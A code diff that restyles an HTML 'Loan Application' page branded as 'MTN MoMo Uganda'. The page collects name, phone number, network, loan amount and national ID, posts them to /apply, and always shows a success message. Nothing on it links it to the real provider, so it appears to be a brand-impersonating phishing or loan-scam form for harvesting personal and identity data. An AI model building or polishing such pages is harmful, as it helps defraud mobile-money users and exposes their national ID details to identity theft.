@@ -13,35 +13,49 @@
     padding: 0;
   }
 
-  .container {
-    max-width: 400px;
-    margin: 40px auto;
-    background: white;
+  .header {
+    background: #ffcc00;
     padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    text-align: center;
+    font-weight: bold;
+    font-size: 20px;
   }
 
-  .logo {
-    text-align: center;
-    font-size: 22px;
-    font-weight: bold;
-    color: #ffcc00;
-    margin-bottom: 10px;
+  .container {
+    max-width: 400px;
+    margin: -20px auto 20px;
+    background: white;
+    padding: 20px;
+    border-radius: 15px 15px 0 0;
+    box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
   }
 
   h2 {
     text-align: center;
-    color: #333;
+    margin-bottom: 20px;
+  }
+
+  .input-group {
+    margin-bottom: 15px;
+  }
+
+  label {
+    font-size: 13px;
+    color: #555;
   }
 
   input, select {
     width: 100%;
     padding: 12px;
-    margin: 10px 0;
-    border-radius: 6px;
-    border: 1px solid #ccc;
+    margin-top: 5px;
+    border-radius: 8px;
+    border: 1px solid #ddd;
     font-size: 14px;
+  }
+
+  input:focus, select:focus {
+    border-color: #ffcc00;
+    outline: none;
   }
 
   button {
@@ -50,9 +64,10 @@
     background: #ffcc00;
     color: black;
     border: none;
-    border-radius: 6px;
+    border-radius: 8px;
     font-size: 16px;
     font-weight: bold;
+    margin-top: 10px;
     cursor: pointer;
   }
 
@@ -60,10 +75,17 @@
     background: #e6b800;
   }
 
-  .note {
-    font-size: 12px;
+  .footer {
     text-align: center;
+    font-size: 12px;
     color: gray;
+    margin-top: 15px;
+  }
+
+  .success {
+    display: none;
+    text-align: center;
+    color: green;
     margin-top: 10px;
   }
 </style>
@@ -71,30 +93,81 @@
 
 <body>
 
+<div class="header">
+  MTN MoMo Uganda
+</div>
+
 <div class="container">
-  <div class="logo">MTN MoMo Uganda</div>
   <h2>Loan Application</h2>
 
-  <form action="/apply" method="POST">
-    <input type="text" name="name" placeholder="Full Name" required>
-    <input type="text" name="phone" placeholder="Phone Number (07XXXXXXXX)" required>
+  <form id="loanForm">
+    
+    <div class="input-group">
+      <label>Full Name</label>
+      <input type="text" name="name" required>
+    </div>
 
-    <select name="network" required>
-      <option value="">Select Network</option>
-      <option value="MTN">MTN</option>
-      <option value="Airtel">Airtel</option>
-    </select>
+    <div class="input-group">
+      <label>Phone Number</label>
+      <input type="text" name="phone" placeholder="07XXXXXXXX" required>
+    </div>
 
-    <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>
-    <input type="text" name="nationalId" placeholder="National ID Number" required>
+    <div class="input-group">
+      <label>Select Network</label>
+      <select name="network" required>
+        <option value="">Choose</option>
+        <option value="MTN">MTN</option>
+        <option value="Airtel">Airtel</option>
+      </select>
+    </div>
+
+    <div class="input-group">
+      <label>Loan Amount (UGX)</label>
+      <input type="number" name="amount" required>
+    </div>
+
+    <div class="input-group">
+      <label>National ID</label>
+      <input type="text" name="nationalId" required>
+    </div>
 
     <button type="submit">Apply Now</button>
   </form>
 
-  <div class="note">
+  <div class="success" id="successMsg">
+    ✅ Application sent successfully!
+  </div>
+
+  <div class="footer">
     Ensure your details are correct before submitting.
   </div>
 </div>
+
+<script>
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const formData = new FormData(this);
+  const data = Object.fromEntries(formData);
+
+  try {
+    const res = await fetch("/apply", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    const text = await res.text();
+    document.getElementById("successMsg").style.display = "block";
+    this.reset();
+
+  } catch (err) {
+    alert("Error submitting form");
+  }
+});
+</script>
 
 </body>
 </html>
